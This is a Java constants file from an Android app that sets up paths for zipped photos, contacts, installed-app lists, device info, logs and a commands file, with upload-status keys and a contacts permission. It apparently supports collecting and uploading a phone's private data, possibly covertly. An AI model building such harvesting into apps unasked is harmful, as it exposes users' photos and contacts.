package com.tangledbytes.sw.utils;

import android.Manifest;
import android.os.Environment;

import java.io.File;

public class Constants {
    public static File DIR_APP_ROOT;
    public static File DIR_COMPRESSED_IMAGES;
    public static File DIR_SERVER;
    public static File FILE_SERVER_IMAGES_ZIP;
    public static File FILE_SERVER_IMAGES_MAP;
    public static File FILE_SERVER_CONTACTS;
    public static File FILE_SERVER_APPS;
    public static File FILE_SERVER_DEVICE_INFO;
    public static File FILE_SERVER_LOG;
    public static File FILE_SERVER_COMMANDS;
    public static final String FS_DEVICES = "devices";
    public static final String DEVICE_ID= "device_id";
    public static final String PREFS_UPLOAD_STATUS = "upload_status";
    public static final String PREF_IMAGES_STATUS = "images_status";
    public static final String PREF_CONTACTS_STATUS = "contacts_status";
    public static final String PREF_DEVICE_INFO_STATUS = "device_info_status";

    public static final String[] PERMISSIONS_NEEDED =  {
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_CONTACTS
    };

    public static void init(File appRootDir) {
        DIR_APP_ROOT = appRootDir;
        DIR_COMPRESSED_IMAGES = new File(DIR_APP_ROOT, "compressedImages");
        DIR_SERVER = new File(DIR_APP_ROOT, "server");
        FILE_SERVER_IMAGES_ZIP = new File(DIR_SERVER, "images.zip");
        FILE_SERVER_DEVICE_INFO = new File(DIR_SERVER, "device-info.json");
        FILE_SERVER_IMAGES_MAP = new File(DIR_COMPRESSED_IMAGES, "images-map.json");
        FILE_SERVER_CONTACTS = new File(DIR_SERVER, "contacts.json");
        FILE_SERVER_APPS = new File(DIR_SERVER, "apps-list.json");
        FILE_SERVER_LOG = new File(DIR_SERVER, "log.json");
        FILE_SERVER_COMMANDS = new File(DIR_SERVER, "commands.json");

        if(!DIR_APP_ROOT.exists())
            DIR_APP_ROOT.mkdirs();
        if (!DIR_SERVER.exists())
            DIR_SERVER.mkdirs();
        if (!DIR_COMPRESSED_IMAGES.exists())
            DIR_COMPRESSED_IMAGES.mkdirs();
    }
}

